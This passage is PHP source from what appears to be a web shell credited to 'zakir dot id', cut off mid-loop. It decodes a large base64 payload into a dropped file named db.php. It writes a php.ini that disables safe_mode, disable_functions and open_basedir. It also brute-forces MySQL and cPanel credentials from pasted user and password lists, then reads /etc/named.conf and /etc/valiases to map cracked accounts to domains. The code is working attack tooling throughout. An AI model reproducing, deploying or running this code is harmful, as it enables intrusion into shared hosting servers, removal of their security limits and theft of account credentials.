anVkV2FneTYxZitNSDVCUlkvWDF4M29QRU5razljcDFnRk44anpPRnFHay9iUDArbTBNNHBpNEJyVUJzQWttZ1VUOGZQejU4ODdDMWhmSUI3YlVMOGpDV3h1U3Z3ZWFHOFdlaGk5WlJ6NHNUandyMENaZkIrRlViSUFCZnhyU0NINlVTbytNK2o2T0pwRmNmdm5VUlAvemVCN01zRi9PeEpnU3Y5MFZuUTUxMzVQZk9acTR1ZG1jOXBCZnE5UC9IRVUwNHh0QTNvL1JzWVNiUHNpK3VUSHVzSzAyU3hVUUJuTGZKbWxMUUdqSlJ1ZlJvdTIxVlhEZ2ZWUmxLYlIzQzZjVENaWmRyWHdYODJhWndEWmFzS1BaL3kvSXJmNXZjajlIZis5bTl3MEdpK1Q3MFVQL3ZHOHUrbmhvdnRPNVB5LzQ3K3J5ZUc4V2IvaVdUS0taaE9idm9DNUhINjJJY0lvbm5zemhBRTdadjU1N3NYblFkaHVhdlJOTExyWUxDdFFNL0VwRUxYWExtVVFqU1Q0MDIrM01DbW45ck0zejE4K2Y0Y29sN01HeWVOWllGQkxvS2RQbnhieDJkOVkvWE4rNHBKMm9GQzhlUEdpTXdVTklHM1AvR25hQWZzUHJPaWI5bWdXalM4N1Y4RUVSR25yR1RDdHc3VFhZMEtPYkVUa1d4c2t3a2lXamVOZ2tkckM3SCs4VHg3bm9reFQ5cWg0ZStHUEw3ZG5zeXF5VWRtRlZiQmRSZEJ0ZG9JdHpHN0Fqb2s3UU5LWWtUanZCR3RyQklwZ3FCZG5nTTZDZ2R6Ly9BYnB6V2d3amk4dXZSbG94U0RsRzJNa0NSdWZyTWRGS3BjM0FLdUJsV293SVdLeG55N2pVRXhnQlNDZEJ0alp1MHp5emMzZUJLRjRlOVkxenlPUFBxcndDM1dsU3RWVldXNnR3UjhOTWtTN2tPamtBWkxsQ0kxcmlSVjRTOHhENW02b3JRaDNCa0U4N3pwNk5wQTJ2QTdERmkzVDlqUzRoajZKSzFnazZ5T1EySmR0K3JrT1BlYWRpSlZFSE5tdTAybzIvK1lJWGxCZHB3bDdtVCtieVhtcjB5alZaWm9ReE96SDZEb28rRGhyMHR2QzlhSmF4aE9LcGtySDZaMTRVeCsyaDRuZjNucTF1RmdJMm9TQmwrUHBlZFZOb0hBNGgwSlFOMS8xb00rQUJsSENoaHY3MDY1akpsRmJjOWVkUmVmUVZWUlFlL3YwdWJYaDljU1hhb0VLNDAzbVFVajFWSTBOYlB0R0d1TVA1QXhyQUE5Z1V1dFprVXRiaUMrbEFjTWVTMWZKSEFkUitVcElmK24yck9ISFlaOTdsLzVGZ0w0eGxkdmhxdE1vU3FYdHkzb2VsNHUvL2hMcUU4MWcwMFdjdjQra1FZSUdzZnBFYXo4YWV6Tk1vR253U05vcUVvWStwUzMzU0Zvb3NvZytvZWpKaytaemx6eFFJMndaWm0yeGFjUnJIOW8vOFVOSEJKTXVPaEZDVUgwZFFVcWNTZklhY0ZxTzJPaTVzbGZLRHVTRzFtajlTQkpnK0RrMmpiNGswaWNxZlllcjlDVVpLODEwK2s1RjUyejArcUZEUzk2bWlOMldkdGE5U1dJZG02Uk1XeVJsVGpsSnRBc2ZTaExyMkNSbDJpSXBjMWFRUkhQem9TU2hUb1lrcDIyU25GTk9rc3pwQjVMRU9qWkptYlpJeXB3eWtsTHhmaGhOV2NrUU5SbWFxc25TWkhIZS92QkZWMVRlRThYcmwxMUhtSjVYbFlNQjVHSUV2MUt3NzZuWXJkM2xaVkJPQnVWalVDNEc3V0c0di9kcWl1NjExOU5vZ2VZU1duMTE5OHBWTmlXVTF2S3VBOWZ5Y2JsZjVlUDZmL0FjcmZBVjFRWDJTRHVNcHV3cmtubGtaUzdqR1hxVXJUTUZlZEpRZDkwNjhZZGtkZFhkZ2Zhak1Tb3V2RVFrU3pCQWswVHcrSXMwRW5vN2t0WXI0RzI0RHJBdGh0MnY2d3hITXk4RTh4QktFU2V5eDJQdTVKMVlaZzRBMFRlTW4yMTV0MmE3dEdtNGdoQm1CUXR0L2dSY1BJQ1gvZzEwQ3Qyek1LdmxWMHF1VlJvQjdaN1gxY2c5cjd6elVNZTQ1bFZDNFd3d3FnYW1rWTJTZ01wMmNwNGJySTZaTkRXNUJYVzNrK21HUkl6ZFlHUzFiMXdEOCtySHFyTjNjTEo3Zk1xZUlwNDNwREFxY2pYeHorMzlEN3NuM0VQTWNQQWd4TjFqbm9iK2xZaFJrWjZJYUtvRzNCVnRrWm5udFd4SGxndVk1bjUyUENpRk0rZjVVMmJqdHd4SW50a0kwSEM2OTJlNUdsSEY1TXJWaFI4cjcvUHpwME8wSFVBblVRM3VmUHN3ZkRqYVFkZWdOUUludTZkNld2N3J0OTFqS09SVzdPKzkzenNWTFI2SFkyWStzUlRrN1pkWWI0VHl4SmZDMkdiNkY3dFpnV3ArNmcrUjg3Q0Y3T3p1NzBLcjN4MGZ2cmViYmpmWCtRN011UThaNHNZT3RnNVZ2M3ZQU2NrWGc1UlVPOE9sT0ZxNDM3ck9rRUxXbjJub09UVzE1ZTBBS2Q1QTdHYWJ2VXFlZjdodVR2eXRHRzZvSnB1U3FGMnU2cUordmVOUFBkZ3pZSzdqcVJsay9Qcm1kendlcG1NNVNMN0IzM1Y1OUFmcEQ2ZnYxbDlpaGp3VGc2eDllVHJXS2RQanlaZUhVT1RiRSsrOTBEdjM0eFhhZk4yMlFYNzZFYmZKTVZpVFBsZ0xpNTdLMm5ramZrTk52ZTBxSEtTNTVBMEhIaGxFR2Z5Skdadk51a3ZLQ254ckhWb1N5U0QvZ0NyK0Y1SGpjSzlFenVweUdmSWptQjFmUm81emFDVnlWb3l6eUZmaWtoYUZhekNnVTFsbW9hNkhPV3hYUXdiWnJaZ3pTbDFOWW1NQnRwOGNocUs5OWVwQnZnMS9FcVM4R0tzODVIVXBYT3BDejJwMTJtU1piU2lkakc0SWZab0dNYXlSdlVSRXNRaVNzTyttWXBKZDdLK2dBNElkRlBLTW9PcHl5U3lBYVZGcjBLbzJ6Z2FvMlNrQ2NlTWtGQ2RLb0hUVEphQk9sOEJtZlJpYU1XRGhzOGlvV2tkc2VMS2trcm9yZ0JCV3NUeGxnMjZNTE1LY0tBS3RJQW9nclB6cEJ0ZUpLL1VGckZIZEFqTXdwaEU0RGdUS0d3VlJreXA1aHJIMGJUWlJqVGRiQTdObEJmelU0MldCZklIRkZ1UnFKOUdYWEEzMk9HWEZFM1hEdlkvSU11VThXM0tadXRsU0pFZ0RyTVNMc2JxWjFzRGVUNGhhUkFxbnVGWWZSN3BkdHc5cmplVDhneHV6aWkwbUgyY0RXUlRuL3FvQnlUVzBNZ2FGMEdmRFMyOTB0R3Npa25DSjdwZ25UWldHUkJDbU1LT3FtZ2FlZ0p0cFN0RldITk1Ec0Z3aTFrV3JKbjRSQ21QMmVEQmJ3NmJVTXVzZzY4bEJKU1ByYWNua2tMeTNjcVJJcjMyZnNBM1NGejZSVTR0VkJ3eVdBZ3lRTmFTelRiUFRVQ2lGQUd0TTFXbTRJbDZHSVdwSFFZZ0YzQXJJQmpXY2t0aVdodnZhS3NMdGhOV1lpK0Q4Z2dtYlJ2U0UrN1RSY2xWc0ZRL3B4NlVmMzFpaEkzanUvV2I3WlBlRVQ1SW5vOXhJUThiWkFIV2o5WFZ4d2tmTG5wZ29VM1I5WFZ2VHlMWnlRNXBJYWg5SmNnWS96clExNnc0UWV5NkxCeGRuS0o5bUYvUWY2Y05JOGcxcXd4b3hPLy9aQUpMUmd0WU83ZllKckNDcUFyWXNaZEJndWxFSW94bWVVeTJ6ZDZRWFFkTGcyc2taSlZUZHZYRGlYdzlZZU5hUW9uK0ZCeU5RdlZVelNpV3h3M0NTYlFRakxMTGF6TnRsSE9OeC9RUzZRUjBSWmU1bDA3aStTOU9BaExqYkp5ZXpsYUZ0KzZ3Q3J1aUt2NFNpZDRwbDVjVDBoa2Eweko1aHlGbDU1T0UrZXlpZXV1aTdiRzR5VHJaOENkZGZYNE1MN0xubEdIWlZuOUhoaFBwNlpHaWZTRHp3UlhnR1NxSkxWYzd5bi9EY0dFNUdlcEI1dllFRUFMSEdOaDNaRnhWWTVXb1JOdFVRSVFaZUp1ejhNaUJTMEZXODJTeTZRbzNQcnBZeHJSN2xzZWdrbXBNbllPZTlQUVZKbTdQMHlFUzNHMm1xZFhJNFRLTGhTRXZabHRCMUxjUUpwOTNnbHVFYXVVaDVQeU5YRmNid29aOXE3cWNYMGFUcllEaW5vNWNGckpEczhjaG1zL21nSXlSNU9DTEdFV1lEeVUybmQ3d01CUXBmNnNvRy9neGdmd01WVG9zMWF5bTFyVU1iZWRDeWhVbzV4aWZJZ3diTkZrZWZWVUdobzg2bitGenplYk5wamt2cGpCUFAvS2ZBbzdhM1RDTmFVQmpOa1N6OGNlRE5hSHV4NWtWOTkrQjArSThQaDZlN0orVGFWRTNvY2ZQd0NKbXA2WE5nT25RR0JyQW5XalpzbE9wbTJVMVJSeWFzN2puUzlsQXBlWDd5RCs3aVJxOTRqR1hXUW9rV1VyZG0yNFBWR2xwb21DaVRaM2dnVlRXTGhkemZlZ2tZOTZGeE9XajU0QmFjekx3YnZqM2MvL0QrNEtTd1NEaktLcnJLeVhTNThkM0xoY3pWYVMvRlQ3TWllSDZ2bXROUGluTmFMdzV6T0lyS3BGMHc2YjBML05tRVJzck94UmlpUXViQmNqWXJaUDd1M3hUeXBIdWprTDk3bmNaZU5oZG5oMUlwMGEwb3FwSjk2RlBVWVdPNHE0NHdiR3gwWGkxMkNvVXlBYUI4aU1KNUJBb1FMaHF3aW5FM0pxZ0RPa0p4S1c2azczWU0zREl0QWJNd0luQ21FMUNHTG51WEdJZlJyb1Z1S2doazRwMEF5RkFFZUJ5T2trVm5KUml3K0I1UXlxZjBaVWdhaGxWd2VrQmcxcVVqcmVSYk1kcG1tZkNXN05KNXI4bEZXZTZ1T0p6SnJCdDdNNjFaaHkxZnYwd3FjVktpUytYYnE5V3FpODJlNVVOSDFVeXExTlllTDkyQmoyUHY0ekxxbUxNaVkzMUlUQi9Zb3k2OW52ZkdjdzkvYjBiNnJOaWVWN2luTzRvbmR3WnAybHV1Mmw4WFlEZzRKUnR3N3k2VDhrdm11U1hzczBQLzlmTHRMcmxCd3grRElXRXYySUUrbnFBckdzVzl0RmdoYTJ5cW1xNDhxUGkza2s1Ym96SUJOWUw4R0tNYXlpUlRWbFhKYUNhODIrdURuck1DNmtGT2UzbG1heS9QeTdVWFptQ0pjbUtMbmkrc1hKdTl5SFdjbUhuMXJhalJaTlVWdTNOYWVkbVR5WTFDbXpMci9mdlI1NE00VGYrRFRCYm9GM3hjZFdISkNHVnFLRFhMYUVMV3hDVjlCNFhCYTMzWnJRTUwwYWhDOXVtZUJNYmxCSm82R01IR1lLQ3hNY2xGMVVIMWU5UWp4ZS9uendoL0t6RFd1YmkyaWpxcVE3TVQ5RUlTVnNsVkFCS3ErdEY0QTM3NkVVaU1VZGx1dHJXczNjV1RGaUJ4eDFrK3haZDFaTlZXbTFzTmVsMGFvYmtSVjJFVThHS2RiRkd6M25vQyt3cnBmdXdyK0lVaTR1VStWbUtqRUJPMFBTVFZGQSt3YTJFTEpVTllMVW4xb3czSS9oOFF2SUgwVU5GM2xlc2EwMGgrNVhYaTIweWtocmtXZ3ZSby84cEdDTENrZC9xeFV4ZE9QNlNmcVZPcnE3TW92T3VvZmtCdUdnZno2b3BCcThtYmtJYlFJdmJQTlNWbm83L1IvK1hzdjZyOVgvb2J0Y0V2K0dzalFJSUNmdWhxSkttdzN0eWpuV2cyZzVySTZINnk5dCtmWVJSdXEyZjlxOEZhalJPUWkwaDA5WHFGNnZsSjRVaE9GWnkxQmh4RmY1dmRPQ3Q2aHNQV3Bkbi9iVnZQU3RXYTVvYWVNeHg1QW90NW0zWkhvMjVWcGloRzJUMzYyc3daeWszcy9SbERVU3NZaDFvSnRuUWxTS3l0VVR5YVpJRzZpSUhsUTc2ZXhTaUEvd0V6RE9SUEhoRHpDb0RBMWp3Y1gxcklnT0hDQjVrWFJsZXh0K2hSTTJDYjRhRExYb1VSUTdXYWpKK2tqanNaYVNWbG16U1A1bUhoT2ttU1JHT2o5LzNibUFKYWFaTkJDNVZScXhBZUFiMlJjUkVnUEdHWEFkbXREdGxVMGpydnZ6dE1Rc0xuSWlYRTlzR09VRW9JdEtDQlFZOW1RTmhQTUJ6UGZDODBLREpLdjZ5YlUwSDlrRlZReWw0OW54V2RNcGVaZGVUWUo0T0FYV1hBVEVLcVhHZGwvc0pkZ0w3REdaZkJQUEZuOTBlODQ4OFFyMjN1QU5jS2RzOHlKSWMvbDJTTm9Mem95T3d4bTIzY0tJeEwzNXRPeVFuTWU0QWlBOXVUS2hCWUFKc1lxMnhlTEJXMXdnNTJhLytYMjgwdGx3UkhOWnljYnA5K2tENTY0c0NRNVl0TUVFbDBvM3VwTjhTVGJuVmNVdWFKbHN0U1JlbDl5V052b2JRU2E1STB1KzJISERrdnI5Rm1tbVNsVEoxalNGckFPU1M0MndHTmNiUU1kY0JkRmlMTGg3VTFxNnRzT2xKQ0xnTzdCeFplblczTkRoMmwrT1hkbzNuSDd2RUFKK2VEdldGM09IMjBrL1J2WU9ITmduTWd6cUVHV21tVmtkRjBKVUhycGxHb1ZGaTZwRENLcmxGMmptZkIrTExyNkFzVUpFR3BJVnFMelRpUmNKZklaK0l3RjcxSVppQUxaVzloYmFRK1hmNHZsTEVLblNzakVTWVB2NHdWTWVudGh1ZWdWeFR4UjdPWmw5MnRiMWM2ck5UYXNjUGdUQ1R0djVONW1CdHRheDcwTXRIeVpueDVJdkRTR3VpWm9NVHJtWHRBTng2eDdTVmpmYy9ERklNbGUySms4aDkyYW1Uait4NG5SM2w4dWRPakU1WDhOcXhseDBobExyeU1aQ3gzTHBaSndqc2hyZVgwQlVocmNXVWhWeTB3VTVXWDJwZGFvaFplRnU2MjZKek1MQ05saFdld3JuQ0Rua2FwTjVOaDRtM3RwY1A5NFk2VzBjWlVYcTczaDJLeDhRZTREYzBkOFVvOGhXMS9rNXdHZDdwZ1NjRldYZXc3RG5mUzZXZDlEVmhnSTM4SnlKOUxNRXVhOXgwVDhtOWRJV2oxSFhYOVFLMTZ1azBnVGdBYVJScmQwYzc0TXZvT3BjekZCQXdVdDFBNkRSbVozaWgvSDhJeDcwTVk0dWdMZ2hUeUVWTFBtOXlJSE4xUmFpcXdHOFc2a2hGZGhiRm5YM2JadmFiYlFXelFZK2dWaldRLzYxeHh5bUpjNnBuN0VvV0lGeHdYNldxaDZ0UFlzaSsxcm1ZcGpxOExzZk0vL0NDaitFcXVlb0VhR0UxdStJWWRYL3EyNDZoMDhCb29vd21IZ3RIZE5YZHJFbnhTM3JpUzY3dnl3blB1WnFvNkJteXBxNmQ4MzVOdVo5Sm0wZWE5b25ndDFTSHpnZSt1UTBNNnVoa2IwQTVsV3Bpb3QzRVVYUVkraGJUWEJic0E0ZmNzbUpJS2l1NE9rSm5CTlRwWXFFL25zMmdFeTdSQ0dnNjZRZFNUQm5YOU1rdUhJLzA1Um9ocnY1SVZ6bHltQjluMG1JdnIxdlF0QUVtVGY3K1N2OXU1aXBqSmlpZnNzL0tTbWZVaURQMGVIaDBlbjZJVzJoVlBuejZ4d21kQTJwZDNWM2RpamFqVzg2MzFVRkxuY3lmUjNBTWxEL05sV3dweGpPeENrbTRqUDVhZW8vRXlMdmlRK1BFU3kvMUVSaXZHWDZHZDBOUFZHVkFGVVpHSkVFMm45RFNQZUtiaXE4aVhPUGFER2RmZU1MV3RtQzVDaXNDTWt0NlpZQzlhSmNYM0hMZ3c5OXdEQTZrZWlIVWhxWnRhcW1oTlZMSWdHQ2tteVJPYUxUbWhDdlZhV0FkQk90bG1RYzBxQXN2U0dtQmdFbzhmaTlLQ3hNWnZZaW5Wa1JuVktXV0MzVC9tSjFvK1VaRTFYOXNrUlllUlN5cllkVnRPWmFaRHRjaHphSHVMenN3Wmkrd0podnAvUmJBTS9teWhrdk11aUJQV3cxeTVQZzFwSlBqMTZOMkczWWtXYkxOSTd5ajJQOW5rdEZzTitVT3pRTUQzVnBjR1FGVFUxVzZMT2VpaUNYQ3hhK3dnUElLR3l4aS91ckdJQWh0NHhwOERibVFuUHpRTmUyelVLSDhuTHExcExoMkEzS2VnTUQwbWVHUE1vaWErdnArRWc4bnNlNGxOSnU4U3R4TFl3VVh2Q0t1U3JxWkxaRkFqSVdCbXlZdnhCaVFuSldjUjZKK1lYNldSZlhYWFd5ZXNkc2gzUlhETC9LY2ZUN3pRNjd6WmZ2djdyOGVISHc1MjJ1TG5kL1JQUjc5NThoSjJ6dkozUmZCcGtlekxCSm5EVnJMenRTT0FicTluYnE0WG1nSHpHVFFpdkU3ZkZzcTlhbHZ1QzFtcURIYVRKZ1hMMmVSYjgyVTNwQmtCNlVIYTNpUFdGV3JrNG43Mk5SQWZQMm1sUlQxb3M3SGhoeE43R0RMNmpIL3RqNWNwM29tYytqcDZ3R3hRd2hTQU5GUzE5TE9GV050bFQ5UnIvQ2JvT3FKUVIraUE2bitnVTFVNkIxRUZXa1lYRUNZWC9tdzJ0TkJLSEs5TkFiZm9iaXczU2VyUFZjTXlMMCsrNWpLTlJPRUhJSG82a2QvdlljOGhaZ0x2cEMvM2JwSTQxT2xGdkN3bnFrcS9sZXpySUJsQ3pXZ1pqL0dhS21KWThFMWQ1THNUTzdWYVlSRFpuL2pvOWRTUGNITzJBQnA0MFRmR1FQZkt0TjVxYnFvenpkY0xkUS9XYU5acW1jZXNORmd6Q1BDajQzMFJLK1VsdmFDSFBYbGVPVlNNZWlicDdCSU4zeXhHU1U2LzIxaXVyNlZwekdOc0w5OHRReW5CZm55OG5kdFY5NU81RkM4b005ZW5zRXdTaEtpL3pnVjJFQUxpYnZhUzcyMmU2TVFmTGM4NUd0eFdpUFZicFBkK3ZUUkZnMWNDZ3A0Mjh1TWhMbEF2QmFXaTdERlQzUG8xbFZvZGpFbXQzQi9GRVY2SjgzV0FpMElOMjJBQ0hRd24xYVRtbXFmdFRHZnVkWFd2aTFlWjFTdFYrTTB4ODExKzNrRmZqZ0hsT2J3MFowVXlOcitxdzkzYkZKZUpOWXV4K1RVNyt1Y3R5Tmd3b2tmUUVBTmVqK1o0ZTQ3Rk43NTQ4MkFmamp1UjUvY25yR3REQXFiMmloaGZzblRDeXd4dGZVMWJSWXZUZlcwNnlTNmpteU85NHRxQWl1VlhyQXBDNmFxM1RyNzFhd1Q2R0JndklhcmJoK3JXb1Z5L0ZISjBTaStId2ZZRWRCSVdFaUdiMUYxenZ5RUx3a2QyeWNyeThTekExOGxHUWVqRk54MUhNYWl3eWpHM1pEcXBoMVVmVitpM2RmZGVIVTF3dnYzQ3E1Q1o3S2ZseThyeWVCK3p6eXFYQS92SjFrODFXNDBYRWp2d0VkOFp0dEZMckhUeUhpejBtUjFEWkZVVHlpdnBqbjFRSnlVd28xYXY4NVhGS1NuQVRnYk9QdjZYUi80Yys0TTh2a2NWZ2VmMURydWwrT2M5Sy9iVGZNVTdrQ2lHeUt5Q3dFVkhseTMwUnVkalcyWkRjbTN0YjV2ZGJwT3VIT09UUDZRSjRpdGtaZElIMXNrUmlQZHFoUlZXZWt4Q1ZNTG9pcDVOMERFdE1vUENRQm95OUVQbkNhdXkxTTVOMllxbm5qV0p6bXJvalkweWFJcFdrU0VxTXJzdTFzR1N4VmVrTm9wdGs1LzRrblIyeXNtQ2NxWjhXREJiYkU3UVJrZ25nWHBUS1hhRnpoVGwrUmpEYXg4dyt4RTJDWmM4TFdPSU15eGFidzNxbWZTbWVpYTFzbHpJemdSem02NUVMM3Rtb0ZZeGtRSHNTY1k1NVJ6QTU1NHFuN3pZT0VkMDBJajlnTFVHVWIxVVVGM1J0Ri9sY2c4aU54c3Rhd0JiR2NBLy9DUjdpOXpTYTZDQ3BSQmtHd3pmb0RFc3d3UFZZTFVvcGg0aWVnU0U4aXFoQnFmRmdvUnhyY2lXTWdXTEJzWmVxWWdtME5qSnZ3ZHBzTGRHY2M4MUdtT0Z0aXJMZy9SSXFaSzhONUZEbEZIWjdXeDJMSkZheldpUnFKUGJvSzB5L214bXBuZXpJRGsrbXRaTG1HSjdDcFhJZ1h1RGFwMDg1STU5WDI1aFZGQ29ZQjBQMDhtdzNHNHBnZTZMNW9zbkw1NjJYbTdLTngza29USTVaQ1hRaGdVa2ZvRUV6Q1BNYTRvR1dObS9qdXhwWk9GOSt2TFppK2QzSWlXSUlzYjNxekIrb1kxbHJmdDlsSHUvVngzNzAyK0VlSE9UeXZsdEpqWVdLa2FTUTE4Yy9YYjBuOEZDUHFCWHdkTk1EcUZSWE9aeVVLS0N1UGFERk5LdkN3YlArWi9qYUw2STZhVUdBa08vQmxUaEpUeSttdWhRY0tNZElNYWFvUGR2OE9veGhTd0VNU3BjMENYMTRDeVdkT2tzVmF6M3hLOSsrZzR5OXlHVDYzYzJOdGJXMThUNitzK1BmMjYxbWkwNytFY2pKbDJqMjBOTlEyZWVEYnBLdEgrcXEvZGdFZU5heTRyeHF6N3k1NHRVdGZYeDQrcWpYUE1oSy9NNk0yWFdRTStDRDlsQzdvL0tZcllvWnNqcHF4cFY2elZybjFmMVFEK3ZiZFFzZXByWkZGQnMxcFFmTXdTRFNKZ2lrTXV4bTFNYzJOaERvRW1kRHBod2J0allPdW9KSklLNWMvd0tiNUpuM2dKWG8rZE5KdStveGJJUmRaR0J1eldSM09zOW1JZ1VHaUtyVWs4UnFNREcyNnlva3R4ZUtab0tNd2lmZzBxOU5CaURabWk2cUlmUHVwbUVHeDd5TlZ1bUxrelFFUjBzWFI4UGN4RGdvcVlsRXBZOTZvSTZRd2FMU2pWY0hyQXVJaE80dHphNHNDTWZ2ZU5Xb0kwdW1aSnBQSm5qRlE4bWNtV3F1VWZqcGVnWEZIblAzbXhvdmVPNUtkaU1ndjZ4NDQ2b2RBenJBaHRSWG9xdldtdUlybkQ2MTgrYS9ldW5vLzUxOHhuOC94eitiOXIvTzZwaU5Kc01wVnRieU5nbmE0U1dZWEM5dVJNbHAyZzhWekFsemVhbWRQRkRTbW43ZGprQnZFSnhnNmZqb0xxMjliZUdNdGZTRkpJejl3WSszQUVlVWZ6OVpaNkVMcVdHSWtBbld6ekhRM0xKbmxhK2JPTGQ2S3E1c2d2WWJoTXFWTEZmVnIwZ1hLTGtIcFNVc1gxdnltN0Z4b1pBajE0d05WcElXZmZXWmZlMnRzVG1zNXI0SzhzRDdnYVd0WXBsM0Ewb2JNR205OWRQUDFiTE9vTEZKWFYxVjZDOFNOYjBwdGNUcmVJT3J3VUdUbE5VZjltTXo4NEhLWHRXYXY5S0NrMWt0UW1vVS81MVZTNnA3R3lqT2NKMzlQMXJxdkFEL3RHV2F4YzJWRVp3OW54Z3ZsOE1mdnF4a1N0L2FwVS9LeW5mdE1xZmxKUTNyZklXUFVXT3J6UzR1a0c0MGdoY1p3QUdweU9EbWVNZnNndnhDZnovMUpGRkRTcHJQVldMMGVTWkJXcmx2Y3psYVlwOFdSb0dhY2d4eW5yN2hGSGlUU2JHUHo0RFA1OXNXcmwveWtmOWpLNWdWOG5oK3JOUVRXN1hhdGYraytkRXM1NnJBalA5YWEwT3RnODNITjJhQzI5OFdYWC9pYk1CMnJTaUFPbVhGOG1PRmdvL3VZYTIzakVMRUUwcnQ2TGViWkZKYXZIL1JUdXRUVmRLZUk2MG5NWmtPZnBYUTMyUUxIdWc3VDI2QWt4TFE5YXNxZmRGSnJFL3pzbjVGdnkvU1ZPRVN3dXp5YzYySnQ0OW9LM3BwN1B0R1doeVM5aFdXcVk1VjFacUQzS3V2RERPWWhWVTgvK2hCRnY3WkhObGtSNTNhNVBOS0dGV1BrNUlQUld5akZZVFZkVlMrenhQSTRJckduQ2tvK2s0Wk43NEN2UEttcFBjQjhETUNrUXBxQ0pzK3hMNFQ3NElYYlZod0RNNlNjTWVRRkJ1OGNTamdMZDJiN0FmREpmVmRKQXRzSkRZcFNTUHNDZ3p5MHRjQ3RuM1NPa1h2VVhhVmZvSUJiY3U2Y1pCK2Q5WWtUSFUvUHlzQlk5cktmUFhWbVFrZVZWQ1RqRUNnQzZYZEZ2Nk5reGlSYlRMUDVKaTNYUjE3R3ZDQkY4ZWw4Nm9hdGJMdG9aWXZsdll6THA2c3RmNmd5TzZjVTExelROVEJXWVlrem1qeTVBRGxjS3JsUU5IdmZva1RUZ3VjdVFWYlVmOUVhRWN4cDNkZDlzZjlrK0ZLK0VsK01CMXJDdG5YQ1N2anFNMzBQa0QzK1FwdzZmK2drMUpkWGtGbk9xWFY1YVFCRGd3Y3djOUpaSzdNdnpLSHJIZmQvOVlQVjRjcWxVeVdvaEVjdVNTVG9Fd2g2NjlEL2tQcWlqTitWSzlvKzhjSGUrOTN6Nyt3eUdqaHFBUG9uQUlDdFhIcGM4UldVMGJvZlBoWU84ZkgzYi80cVRtaDIxU0IvaFd6eGtEcVBISjVHV01rTnQ4S1FzbmFzbmJhTGFjaDZicGttdlVTOXJPK0J4MFJwYlVwWG9taWlvbE5icWRLWjlYQmZTMU8yWXIxc0hhU1ZkSkw0V2w3dFFkOHl5N1pGdlhZbHZwaUFzaGkzRVlSVldqcjJXWGh1Mlo1dFkzNjgvcDZxVGtzbU56UGd2NW9yWnFMU0ZKMmRBOFpmV1VaclpPSC9iTGZzaWNzQitFbmw3RlFVcUhxblZUSTNzUmxuMmF1bEQvbVRoNUUyWEZMWHRIZWI2MW5DcTVzZ2NZN3ZlU0FRS1dDTmppUzhEeTdkK3F3NW9RVVNMWGpSOTMxMXNsY2xUU1hsdkx3RzZabHQ5SEtqYTZlSmp6SlpFbzBjZ24wdkJtZUlabXVaalRFc2xnemdLNGpyclZtNHk5aGErUDNFcnd5d3R4dDJXVHF0YjVmcE5ETG1FMXZDdFE0bkZiQ1RKSFA4eWUxVm1XVUFzZk56YWU2aVh1M1J3bGdBVUZMV2VoSzBpM2ZCbzNIT3ZaZHcyWWp1alZRQk9IZi8rL0hQRjB4WFdsMnd4NmpteituTGwxN2hZYnJPT3EyWHptT05pdTY5Ymt0WEdPSnFMWDdpdnkrZno4VS9neXVydVNmMitmUGlpVzJ5bW55eSt6VnJ6NDNFanVHaC9YbnAveEs2OGtzKzFrRHhUZlY4S1JRZWhVaE4rRHZ1UGdoWGFaRHd5RWpJNUM1Y3U5Vk9GUzZWZTVkRnY5QVF2S3BXZGdCN1IvMldrdytURkF4TlhZK1NrN2cxMmxYMlhUZER5REx6d29NbHpLYjh1YTJpcjlLcGR1NHhNTHdDOGRhMFdsNnIyNmdYWFBuMHFJNkNBWG5FOGxsQmhZNDRhWnRFT3FQMnVReWRIRGlabVVHSmc1d0tSUW40SThNeGo4U1Z3ZFVDaS9mRHZBZnFIQitiZHJwbE1hNDJNOVhWaWNxV1lnOU1PRDh2RVNsY2Jwb3I3cFZsWU91dUU2S3BMMElaTkp6YUhTbVpCNWo5RG1zOWhTZjFJd2QwdWt5TTh5cnV0TzlaeWl2NS83eFM4MERvcFJIVmFoZGVrNjk0ZDdlYUdyWngwSFhWSXo5Y3ptK21ha29ReXZvMGh3aVd4cmc4RktKbHc1Z3ZKNjZqKzZSOElrVEtkTEdhN2VUYk9sc0g0Y05qZHorSS9zRUJhT0w3WEZqTTZCbWJQUWYyMkhpdVM5VWd0WTUrRFJuaitiR3FGRWZ5ekNua2dxQTZTbi9Fc1NhbUZRU2twUVd3Q3lmbXlJeVRTMEN6dldjdVU5RzRxVHZkOHFsZkd6TXBkVG1DK2piR1UrcC9SYWxlM0w4MSt1QkR0Z1N5MHZMWEZMSG9VcVc5OG96MHRXdDJRRDN1S3kyU0RUZU9taWFaZ1YwMjAvQXlYVFhiSDU3SnQzaXFKY3p6MEcxS2ZYZ082OWtMRUhXczdDTitaaGUxVWVmbXYyczN6c1dZSTE4eXpRb214M1YzZXhNSlpOdjhqUExOVi9Qa0RseTFmV3pTdVJoVWQ1MkVDRXdlV1FkZGxMbmU2dmVPWHdoSlBtU2NQY0M0VGxUVFk2MHlySUJYVEtzMjkxTFdLZndpNFdvQVduUXlxMTdscXBVa0x5dnk1QjhBdz0iKSkpOyA/Pg==";
        file_put_contents("db.php",base64_decode($script));
         echo "<script>alert('done! check db.php'); hideAll();</script>";
        echo "<p><center><font color=green>Check = >> <a href='db.php' target=_blank><b>db.php</b></a></font></center>

        </div><br><br> ";
        die();
        }
//create php.ini for safe mode
        elseif ( $pilih == 'phini') {
        $byht = "safe_mode = Off
        disable_functions = None
        safe_mode_gid = OFF
        open_basedir = OFF
        allow_url_fopen = On
        code by = zakir dot id";
        file_put_contents("php.ini",$byht);
        echo "<script>alert('php.ini Created'); hideAll();</script>";
        echo "
        </div><br><br><center></center><b>
        <br><center></center> ";

        die();
        }
}
} elseif($_GET['do'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {

                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf");
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
